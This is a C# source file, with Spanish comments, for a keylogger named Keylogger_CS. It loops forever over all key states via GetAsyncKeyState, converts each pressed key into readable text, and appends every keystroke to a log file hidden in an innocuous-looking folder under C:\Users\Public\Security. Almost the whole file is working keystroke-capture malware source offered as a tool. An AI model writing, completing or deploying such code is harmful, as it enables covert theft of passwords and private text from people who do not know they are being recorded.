using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;
using System.Windows.Forms;

namespace Keylogger_CS {
    class Program {
        [DllImport("user32")] private static extern short GetAsyncKeyState(int vKey);   // Obtiene el registro te teclas
        static void Main(string[] args) {
            // Éste keylogger falta pulir.
            const string PATH = @"C:\Users\Public\Security\TelegramBoot\Hola\Boot\";   // Ruta del archivo log  
            const string LOG_NAME = "reg.k"; // Incluye extensión
            // 
            void CreateDirectory() {
                try {
                    DirectoryInfo di = Directory.CreateDirectory(PATH);
                    Console.WriteLine("Se creó la siguiente ruta {0}", PATH);
                } catch {
                    Console.WriteLine("La carpeta ya existe");
                }
            }
            // Conversión de Teclas.
            string Converter(string tecla) {
                switch (tecla) {     // Convierte teclas en legible
                    // Mouse
                    case "LButton": return "";
                    case "RButton": return "";
                    // Use Común
                    case "Space": return " ";
                    case "Enter": return "\n";
                    case "Tab": return "    ";
                    case "Delete": return "<Delete>";
                    // Números
                    case "D1": return "1";
                    case "D2": return "2";
                    case "D3": return "3";
                    case "D4": return "4";
                    case "D5": return "5";
                    case "D6": return "6";
                    case "D7": return "7";
                    case "D8": return "8";
                    case "D9": return "9";
                    case "D0": return "0";
                    case "NumPad1": return "1";
                    case "NumPad2": return "2";
                    case "NumPad3": return "3";
                    case "NumPad4": return "4";
                    case "NumPad5": return "5";
                    case "NumPad6": return "6";
                    case "NumPad7": return "7";
                    case "NumPad8": return "8";
                    case "NumPad9": return "9";
                    case "NumPad0": return "0";
                    // Teclas Control
                    case "RControlKeyControlKey": return "[Ctrl]";
                    case "LShiftKeyShiftKey": return "[Shift L]";
                    case "rShiftKeyShiftKey": return "[Shift R]";
                    case "Back": return "<=";
                    case "": return "0";

                    //Signos especiales
                    case "OemMinus": return "-";
                    case "OemPeriod": return ".";
                    case "OemComma": return ",";
                    case "Oem4": return "'";
                    case "Oem6": return "¿";
                    case "Decimal": return ".";
                    case "Add": return "+";
                    case "Subtract": return "-";
                    case "Divide": return "/";
                    case "Multiply": return "*";

                    //Navegación
                    case "Up": return "[Up]";
                    case "Left": return "[Left]";
                    case "Right": return "[Right]";
                    case "Down": return "[Down]";




                    default: return tecla; // Muestra en consola la tecla obtenida

                }
            }
            // Inicio 

            CreateDirectory();  // Crea directorio del Keylogger
            string key = "";
            string buffer = ""; // Bufer
            StreamWriter F = new StreamWriter(PATH + LOG_NAME, true);

            while (true) {  // Se repite el proceso siempre

                foreach (Int32 i in Enum.GetValues(typeof(Keys))) { // Recorre el Array de las teclas
                    if (GetAsyncKeyState(i) == -32767) {        // Si el estado de la tecla i es igual a [Const de tecla presionada]
                        // Buffer 
                        key = Enum.GetName(typeof(Keys), i);   // Obtiene la tecla oprimida
                        buffer = Converter(key);
                        Console.Write(buffer);

                        F.Write(buffer); // Escribe texto en el archivo
                        //

                    }
                }
            }


           

        }
    }
}
